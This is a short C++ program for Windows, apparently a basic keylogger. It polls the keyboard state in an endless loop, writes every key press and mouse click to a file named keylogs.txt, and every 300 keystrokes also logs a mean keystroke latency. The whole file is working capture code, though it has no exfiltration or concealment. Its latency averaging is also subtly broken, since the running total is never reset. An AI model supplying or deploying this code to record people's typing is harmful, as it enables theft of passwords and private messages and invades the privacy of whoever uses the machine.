#include <iostream>
#include <Windows.h>
#include <fstream>
#include <stdio.h>
#include <string>
#include <chrono>
using namespace std;
using namespace std::chrono;

void WriteToLog(const char* text) {

    ofstream logfile;
    logfile.open("keylogs.txt", fstream::app); //opens file for writing
    logfile << text; //writes text string to file
    logfile.close(); //closes stream
}

void WriteLatencyToLog(double latency) {
   
    ofstream logfile;
    logfile.open("keylogs.txt", fstream::app);
    logfile << " Keystroke latency:" << latency << " ms \n";
    logfile.close();
}


bool KeyIsListed(int iKey) {
    switch (iKey) {
    case VK_SPACE:
        cout << " ";
        WriteToLog(" ");
        return true;
        break;
    case VK_RETURN:
        cout << "\n";
        WriteToLog(" returnButton ");
        return true;
        break;
    case VK_SHIFT:
        cout << "Shift ";
        WriteToLog(" Shift ");
        return true;
        break;
    case VK_BACK:
        cout << "\b";
        WriteToLog(" backButton ");
        return true;
        break;
    case VK_RBUTTON:
        cout << "*rclick* ";
        WriteToLog(" rclick ");
        return true;
        break;
    case VK_LBUTTON:
        cout << "*lclick* ";
        WriteToLog(" lclick ");
        return true;
        break;
    default: return false;
    }
}

int main()
{
    char key;
    steady_clock::time_point lastKeyPressTime = steady_clock::now();
    double totalLatency = 0;
    double meanLatency = 0;
    int keystrokesCount = 0;

    while (TRUE)
    {
        Sleep(10);
        for (key = 8; key <= 190; key++)
        {
            if (GetAsyncKeyState(key) == -32767)
            {
                steady_clock::time_point currentKeyPressTime = steady_clock::now();
                duration<double, milli> keystrokeLatency = currentKeyPressTime - lastKeyPressTime;
                lastKeyPressTime = currentKeyPressTime;

                if (KeyIsListed(key) == FALSE)
                {
                    cout << key;
                    ofstream logfile; // creates object for file stream
                    logfile.open("keylogs.txt", fstream::app); // opens file for writing
                    logfile << key; // writes the logged key char to file
                    logfile.close(); // closes stream
                }

                totalLatency += keystrokeLatency.count();
                keystrokesCount++;

                if (keystrokesCount > 0) { // Prevent division by zero
                    meanLatency = totalLatency / keystrokesCount;
                    if (keystrokesCount == 300) {
                        WriteLatencyToLog(meanLatency);
                        keystrokesCount = 0;
                        meanLatency = 1;
                    }
                }
            }
        }
    }
    
        
    return 0;
}
